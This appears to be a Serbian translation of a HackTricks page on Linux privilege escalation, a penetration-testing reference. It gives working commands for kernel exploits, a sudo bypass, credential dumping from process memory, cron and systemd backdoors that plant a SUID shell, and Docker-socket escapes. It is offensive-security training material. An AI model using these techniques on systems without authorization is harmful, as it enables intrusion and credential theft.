# Linux eskalacija privilegija

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS-a: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Stručnjak (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Stručnjak (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Informacije o sistemu

### Informacije o OS-u

Hajde da počnemo sticanjem nekog znanja o OS-u koji se izvršava
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Putanja

Ako **imate dozvole za pisanje u bilo kom folderu unutar promenljive `PATH`**, možda ćete moći da preuzmete kontrolu nad nekim bibliotekama ili binarnim fajlovima:
```bash
echo $PATH
```
### Informacije o okruženju

Interesantne informacije, lozinke ili API ključevi u okruženjskim promenljivama?
```bash
(env || set) 2>/dev/null
```
### Eksploatacije jezgra

Proverite verziju jezgra i da li postoji neki eksploatacioni kod koji se može koristiti za eskalaciju privilegija
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Možete pronaći dobar popis ranjivih jezgara i već **kompajlirane eksploate** ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Druge stranice gde možete pronaći neke **kompajlirane eksploate**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Za izvlačenje svih ranjivih verzija jezgara sa te veb lokacije možete uraditi:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Alati koji mogu pomoći u pretrazi za eksploate kernela su:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (izvršiti NA žrtvi, proverava eksploate samo za kernel 2.x)

Uvek **pretražite verziju kernela na Google-u**, možda je vaša verzija kernela navedena u nekom eksploatu kernela i tada ćete biti sigurni da je taj eksploat validan.

### CVE-2016-5195 (DirtyCow)

Linux Eskalacija privilegija - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Verzija Sudo-a

Na osnovu ranjivih verzija sudo-a koje se pojavljuju u:
```bash
searchsploit sudo
```
Možete proveriti da li je verzija sudo programa ranjiva korišćenjem ovog grep-a.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Provera potpisa Dmesg nije uspela

Proverite **smasher2 kutiju na HTB-u** za **primer** kako bi ova ranjivost mogla biti iskorišćena
```bash
dmesg 2>/dev/null | grep "signature"
```
### Više enumeracije sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Nabroj moguće odbrane

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Bekstvo

Ako se nalazite unutar docker kontejnera, možete pokušati da pobegnete iz njega:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Diskovi

Proverite **šta je montirano i odmontirano**, gde i zašto. Ako je nešto odmontirano, možete pokušati da ga montirate i proverite da li ima privatnih informacija
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Korisni softver

Nabrojte korisne binarne datoteke
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Takođe, proverite da li je **instaliran bilo koji kompajler**. Ovo je korisno ako trebate da koristite neki kernel eksploit jer se preporučuje da ga kompajlirate na mašini na kojoj ćete ga koristiti (ili na sličnoj).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Instaliran Softver sa Ranjivim Verzijama

Proverite **verziju instaliranih paketa i servisa**. Možda postoji stara verzija Nagiosa (na primer) koja bi mogla biti iskorišćena za eskalaciju privilegija...\
Preporučuje se ručno proveriti verziju sumnjivijeg instaliranog softvera.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ako imate SSH pristup mašini, takođe možete koristiti **openVAS** da proverite da li su unutar mašine instalirani zastareli i ranjivi softveri.

{% hint style="info" %}
_Napomena da će ove komande prikazati mnogo informacija koje će uglavnom biti beskorisne, stoga se preporučuje korišćenje nekih aplikacija poput OpenVAS-a ili sličnih koje će proveriti da li je bilo koja instalirana verzija softvera ranjiva na poznate eksploate_
{% endhint %}

## Procesi

Pogledajte **koji se procesi** izvršavaju i proverite da li neki proces ima **više privilegija nego što bi trebalo** (možda se tomcat izvršava kao root?)
```bash
ps aux
ps -ef
top -n 1
```
Uvek proveravajte moguće [**debuggere elektrona/cef/chromiuma** koji se izvršavaju, možete ih zloupotrebiti za eskalaciju privilegija](electron-cef-chromium-debugger-abuse.md). **Linpeas** ih otkriva proverom parametra `--inspect` unutar komandne linije procesa.\
Takođe **proverite svoje privilegije nad binarnim fajlovima procesa**, možda možete prepisati nečiji.

### Praćenje procesa

Možete koristiti alate poput [**pspy**](https://github.com/DominicBreuker/pspy) za praćenje procesa. Ovo može biti veoma korisno za identifikaciju ranjivih procesa koji se često izvršavaju ili kada se ispune određeni zahtevi.

### Memorija procesa

Neke usluge servera čuvaju **kredencijale u čistom tekstu unutar memorije**.\
Obično će vam biti potrebne **root privilegije** da biste čitali memoriju procesa koji pripadaju drugim korisnicima, stoga je ovo obično korisnije kada već imate root privilegije i želite otkriti više kredencijala.\
Međutim, zapamtite da **kao običan korisnik možete čitati memoriju procesa koje posedujete**.

{% hint style="warning" %}
Imajte na umu da danas većina mašina **ne dozvoljava ptrace podrazumevano** što znači da ne možete dumpovati druge procese koji pripadaju vašem neprivilegovanom korisniku.

Fajl _**/proc/sys/kernel/yama/ptrace\_scope**_ kontroliše pristupačnost ptrace-a:

* **kernel.yama.ptrace\_scope = 0**: svi procesi mogu biti debugovani, sve dok imaju isti uid. Ovo je klasičan način na koji je ptracing radio.
* **kernel.yama.ptrace\_scope = 1**: samo roditeljski proces može biti debugovan.
* **kernel.yama.ptrace\_scope = 2**: Samo admin može koristiti ptrace, jer zahteva CAP\_SYS\_PTRACE sposobnost.
* **kernel.yama.ptrace\_scope = 3**: Nijedan proces ne sme biti praćen ptrace-om. Nakon podešavanja, potreban je ponovni start da bi se omogućilo ponovno praćenje.
{% endhint %}

#### GDB

Ako imate pristup memoriji FTP servisa (na primer) možete dobiti Heap i pretražiti njegove kredencijale.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Skripta

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Za dati ID procesa, **maps pokazuje kako je memorija mapirana unutar virtualnog adresnog prostora tog procesa**; takođe prikazuje **dozvole svake mapirane regije**. **Mem** pseudo fajl **otkriva samu memoriju procesa**. Iz **maps** fajla znamo koje **memorijske regije su čitljive** i njihove ofsete. Koristimo ove informacije da bismo **tražili u mem fajlu i izbacili sve čitljive regije** u fajl.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` pruža pristup **fizičkoj** memoriji sistema, a ne virtuelnoj memoriji. Virtuelni prostor adresa jezgra može se pristupiti korišćenjem /dev/kmem.\
Obično, `/dev/mem` je samo čitljiv od strane **root** korisnika i **kmem** grupe.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump za linux

ProcDump je Linux reinterpretacija klasičnog alata ProcDump iz skupa alata Sysinternals za Windows. Preuzmite ga sa [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Alati

Za ispuštanje memorije procesa možete koristiti:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Možete ručno ukloniti zahteve za root i isprazniti proces koji je u vašem vlasništvu
* Skripta A.5 sa [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (potreban je root) 

### Kredencijali iz memorije procesa

#### Ručni primer

Ako otkrijete da je proces autentifikacije pokrenut:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Možete isprazniti proces (videti prethodne sekcije da biste pronašli različite načine za isprazniti memoriju procesa) i pretražiti akreditacije unutar memorije:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Alatka [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) će **ukrasti lozinke u čistom tekstu iz memorije** i iz nekih **dobro poznatih datoteka**. Potrebne su privilegije root korisnika da bi pravilno funkcionisao.

| Funkcija                                          | Naziv procesa        |
| ------------------------------------------------- | -------------------- |
| GDM lozinka (Kali Desktop, Debian Desktop)        | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Aktivne FTP konekcije)                    | vsftpd               |
| Apache2 (Aktivne HTTP Basic Auth sesije)          | apache2              |
| OpenSSH (Aktivne SSH sesije - Sudo korišćenje)    | sshd:                |

#### Pretraga Regexa/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Planirani/Cron poslovi

Proverite da li je neki od planiranih poslova ranjiv. Možda možete iskoristiti skriptu koju izvršava root (ranjivost sa zvezdicom? možete menjati fajlove koje root koristi? koristiti simboličke veze? kreirati specifične fajlove u direktorijumu koji root koristi?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Putanja za Cron

Na primer, unutar _/etc/crontab_ možete pronaći PUTANJU: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Primetite kako korisnik "user" ima privilegije pisanja nad /home/user_)

Ako unutar ovog crontaba korisnik root pokuša da izvrši neku komandu ili skriptu bez postavljanja putanje. Na primer: _\* \* \* \* root overwrite.sh_\
Tada možete dobiti root shell korišćenjem:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron korišćenje skripte sa zamenskim znakom (Wildcard Injection)

Ako skriptu izvršava root i unutar komande sadrži "**\***", možete iskoristiti ovo da biste izvršili neočekivane radnje (kao što je eskalacija privilegija). Primer:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ako je zamjenski znak prethodio putanji poput** _**/some/path/\***_, **nije ranjiv (čak ni** _**./\*** **nije).**

Pročitajte sledeću stranicu za više trikova eksploatacije zamenskih znakova:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Prepisivanje skripti Cron-a i simboličke veze

Ako **možete izmeniti skriptu Cron-a** koju izvršava root, možete veoma lako dobiti shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ako skripta izvršena od strane root koristi **direktorijum u kom imate pun pristup**, možda bi bilo korisno obrisati taj folder i **napraviti simboličan folder ka drugom** koji služi skriptu kojom vi upravljate
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Česti cron poslovi

Možete pratiti procese kako biste tražili one koji se izvršavaju svakih 1, 2 ili 5 minuta. Možda možete iskoristiti to i eskalirati privilegije.

Na primer, da biste **pratili svakih 0.1s tokom 1 minuta**, **sortirali po manje izvršenim komandama** i obrisali komande koje su najviše puta izvršene, možete uraditi:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Takođe možete koristiti** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (ovo će pratiti i navesti svaki proces koji se pokrene).

### Nevidljivi cron poslovi

Moguće je kreirati cron posao **ubacivanjem povratnog znaka nakon komentara** (bez znaka za novi red), i cron posao će raditi. Primer (obratite pažnju na znak za povratni red):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisi

### _.service_ fajlovi sa dozvolom za pisanje

Proverite da li možete da pišete u bilo koji `.service` fajl, ako možete, **možete ga izmeniti** tako da **izvršava** vaš **zadnji prolaz** kada se servis **pokrene**, **ponovo pokrene** ili **zaustavi** (možda ćete morati da sačekate da se mašina ponovo pokrene).\
Na primer, kreirajte svoj zadnji prolaz unutar .service fajla sa **`ExecStart=/tmp/script.sh`**

### Binarni fajlovi servisa sa dozvolom za pisanje

Imajte na umu da ako imate **dozvole za pisanje nad binarnim fajlovima koji se izvršavaju od strane servisa**, možete ih promeniti u zadnje prolaze tako da kada se servisi ponovo izvrše, zadnji prolazi će biti izvršeni.

### systemd PUTANJE - Relativne putanje

Možete videti PUTANJE koje koristi **systemd** sa:
```bash
systemctl show-environment
```
Ako otkrijete da možete **pisati** u bilo kojem od foldera na putanji, možda ćete moći da **dignete privilegije**. Morate tražiti da li se koriste **relativne putanje u konfiguracionim fajlovima servisa** kao što su:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Zatim, kreirajte **izvršnu** datoteku sa **istim imenom kao relativna putanja binarnog fajla** unutar systemd PATH foldera u koji možete pisati, i kada se servis zatraži da izvrši ranjivu akciju (**Start**, **Stop**, **Reload**), vaš **zadnji prolaz** će biti izvršen (neprivilegovani korisnici obično ne mogu pokrenuti/zaustaviti servise, ali proverite da li možete koristiti `sudo -l`).

**Saznajte više o servisima sa `man systemd.service`.**

## **Tajmeri**

**Tajmeri** su systemd unit fajlovi čije ime završava na `**.timer**` koji kontrolišu `**.service**` fajlove ili događaje. **Tajmeri** se mogu koristiti kao alternativa cron-u jer imaju ugrađenu podršku za kalendar događaje i monotonu vremensku događaje i mogu se pokretati asinhrono.

Možete nabrojati sve tajmere sa:
```bash
systemctl list-timers --all
```
### Pisanje u tajmere

Ako možete izmeniti tajmer, možete ga naterati da izvrši neke postojeće systemd.unit-e (kao što su `.service` ili `.target` datoteke).
```bash
Unit=backdoor.service
```
U dokumentaciji možete pročitati šta je jedinica:

> Jedinica koja se aktivira kada ovaj tajmer istekne. Argument je ime jedinice, čiji sufiks nije ".timer". Ako nije navedeno, ova vrednost podrazumevano odgovara servisu koji ima isto ime kao jedinica tajmera, osim sufiksa. (Vidi gore.) Preporučuje se da ime jedinice koja se aktivira i ime jedinice tajmera budu identična, osim sufiksa.

Dakle, da biste iskoristili ovu dozvolu, trebalo bi da:

* Pronađete neku systemd jedinicu (kao što je `.service`) koja **izvršava zapisivu binarnu datoteku**
* Pronađete neku systemd jedinicu koja **izvršava relativnu putanju** i imate **dozvole za pisanje** nad **systemd putanjom** (da biste se predstavili kao ta izvršna datoteka)

**Saznajte više o tajmerima sa `man systemd.timer`.**

### **Omogućavanje Tajmera**

Da biste omogućili tajmer, potrebne su vam administratorske privilegije i da izvršite:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Napomena da se **tajmer** **aktivira** tako što se pravi simbolična veza ka njemu u `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) omogućavaju **komunikaciju procesa** na istom ili različitim mašinama unutar modela klijent-server. Koriste standardne Unix deskriptorske datoteke za međuračunarsku komunikaciju i postavljaju se putem `.socket` datoteka.

Soketi se mogu konfigurisati korišćenjem `.socket` datoteka.

**Saznajte više o soketima sa `man systemd.socket`.** Unutar ove datoteke, mogu se konfigurisati nekoliko interesantnih parametara:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ove opcije su različite, ali se koristi sažetak da **ukazuje gde će slušati** soket (putanja AF\_UNIX soket datoteke, IPv4/6 i/ili broj porta za slušanje, itd.)
* `Accept`: Prihvata boolean argument. Ako je **true**, instanca **servisa se pokreće za svaku dolaznu vezu** i samo se soket veze prosleđuje njoj. Ako je **false**, svi slušajući soketi sami se **prosleđuju pokrenutom servisnom jedinicom**, i samo jedna servisna jedinica se pokreće za sve veze. Ova vrednost se ignoriše za datagram sokete i FIFO-ove gde jedna servisna jedinica bezuslovno obrađuje sav dolazni saobraćaj. **Podrazumevano je false**. Iz performansnih razloga, preporučuje se pisanje novih demona samo na način koji je pogodan za `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: Prihvata jednu ili više komandnih linija, koje se **izvršavaju pre** ili **nakon** što se slušajući **soketi**/FIFO-ovi **kreiraju** i povežu, redom. Prvi token komandne linije mora biti apsolutno ime datoteke, a zatim slede argumenti za proces.
* `ExecStopPre`, `ExecStopPost`: Dodatne **komande** koje se **izvršavaju pre** ili **nakon** što se slušajući **soketi**/FIFO-ovi **zatvore** i uklone, redom.
* `Service`: Navodi ime **servisne** jedinice **za aktiviranje** na **dolazni saobraćaj**. Ovo podešavanje je dozvoljeno samo za sokete sa Accept=no. Podrazumevano je servis koji nosi isto ime kao soket (sa zamenjenim sufiksom). U većini slučajeva, ne bi trebalo da bude potrebno koristiti ovu opciju.

### Pisanje .socket datoteka

Ako pronađete **pisivu** `.socket` datoteku, možete **dodati** na početak `[Socket]` odeljka nešto poput: `ExecStartPre=/home/kali/sys/backdoor` i zadnja vrata će biti izvršena pre nego što se soket kreira. Stoga, **verovatno će vam biti potrebno da sačekate da se mašina ponovo pokrene.**\
_Napomena da sistem mora koristiti tu konfiguraciju soket datoteke ili zadnja vrata neće biti izvršena_

### Pisivi soketi

Ako **identifikujete bilo koji pisivi soket** (_sada govorimo o Unix soketima, a ne o konfiguracionim `.socket` datotekama_), onda **možete komunicirati** sa tim soketom i možda iskoristiti ranjivost.

### Enumeracija Unix soketa
```bash
netstat -a -p --unix
```
### Sirova veza
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Primer eksploatacije:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP soketi

Imajte na umu da može postojati nekoliko **soketa koji slušaju HTTP** zahteve (_ne mislim na .socket fajlove već na fajlove koji deluju kao unix soketi_). Možete proveriti ovo sa:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
### Pisanje u Docker Socket

Docker socket, često pronađen na `/var/run/docker.sock`, je kritična datoteka koja treba da bude obezbeđena. Podrazumevano, može se pisati od strane korisnika `root` i članova grupe `docker`. Posedovanje pristupa za pisanje u ovaj socket može dovesti do eskalacije privilegija. Evo detaljnog objašnjenja kako to može biti urađeno i alternativnih metoda ako Docker CLI nije dostupan.

#### **Eskalacija privilegija pomoću Docker CLI**

Ako imate pristup za pisanje u Docker socket, možete eskalirati privilegije koristeći sledeće komande:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ovi naredbe vam omogućavaju pokretanje kontejnera sa pristupom nivou korena fajl sistema domaćina.

#### **Korišćenje Docker API-ja direktno**

U slučajevima kada Docker CLI nije dostupan, Docker socket može i dalje biti manipulisan korišćenjem Docker API-ja i `curl` naredbi.

1.  **Lista Docker slika:** Preuzmite listu dostupnih slika.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```
2.  **Kreiranje kontejnera:** Pošaljite zahtev za kreiranje kontejnera koji montira koreni direktorijum sistema domaćina.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Pokrenite novo kreirani kontejner:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
3.  **Povezivanje na kontejner:** Koristite `socat` za uspostavljanje veze sa kontejnerom, omogućavajući izvršavanje komandi unutar njega.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nakon uspostavljanja veze putem `socat`, možete izvršavati komande direktno u kontejneru sa pristupom nivou korena fajl sistema domaćina.

### Ostalo

Imajte na umu da ako imate dozvole za pisanje preko docker socketa jer ste **unutar grupe `docker`** imate [**više načina za eskalaciju privilegija**](interesting-groups-linux-pe/#docker-group). Ako [**docker API osluškuje na portu** takođe možete biti u mogućnosti da ga kompromitujete](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Proverite **više načina za izlazak iz docker-a ili zloupotrebu kako biste eskalirali privilegije** u:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Eskalacija privilegija Containerd (ctr)

Ako otkrijete da možete koristiti **`ctr`** komandu pročitajte sledeću stranicu jer **možda možete zloupotrebiti kako biste eskalirali privilegije**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **Eskalacija privilegija RunC**

Ako otkrijete da možete koristiti **`runc`** komandu pročitajte sledeću stranicu jer **možda možete zloupotrebiti kako biste eskalirali privilegije**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus je sofisticiran **sistem međuprocesne komunikacije (IPC)** koji omogućava aplikacijama efikasnu interakciju i deljenje podataka. Dizajniran sa modernim Linux sistemom na umu, pruža robustan okvir za različite oblike komunikacije aplikacija.

Sistem je fleksibilan, podržava osnovnu IPC koja poboljšava razmenu podataka između procesa, podsećajući na **unapređene UNIX domain socket-e**. Osim toga, pomaže u emitovanju događaja ili signala, podstičući besprekornu integraciju među komponentama sistema. Na primer, signal od Bluetooth demona o dolaznom pozivu može pokrenuti muzički plejer da se stiša, poboljšavajući korisničko iskustvo. Pored toga, D-Bus podržava sistem udaljenih objekata, pojednostavljujući zahteve za usluge i pozive metoda između aplikacija, olakšavajući procese koji su tradicionalno bili složeni.

D-Bus funkcioniše na **modelu dozvole/odbijanja**, upravljajući dozvolama poruka (pozivi metoda, emitovanje signala, itd.) na osnovu kumulativnog efekta podudarnih pravila politike. Ove politike specificiraju interakcije sa autobusom, potencijalno omogućavajući eskalaciju privilegija kroz iskorišćavanje ovih dozvola.

Primer takve politike u `/etc/dbus-1/system.d/wpa_supplicant.conf` je pružen, detaljno opisujući dozvole za korisnika root da poseduje, šalje i prima poruke od `fi.w1.wpa_supplicant1`.

Politike bez specificiranog korisnika ili grupe se primenjuju univerzalno, dok politike konteksta "default" važe za sve koji nisu obuhvaćeni drugim specifičnim politikama.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Saznajte kako da nabrojite i iskoristite D-Bus komunikaciju ovde:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Mreža**

Uvek je interesantno nabrojati mrežu i utvrditi poziciju mašine.

### Generička enumeracija
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
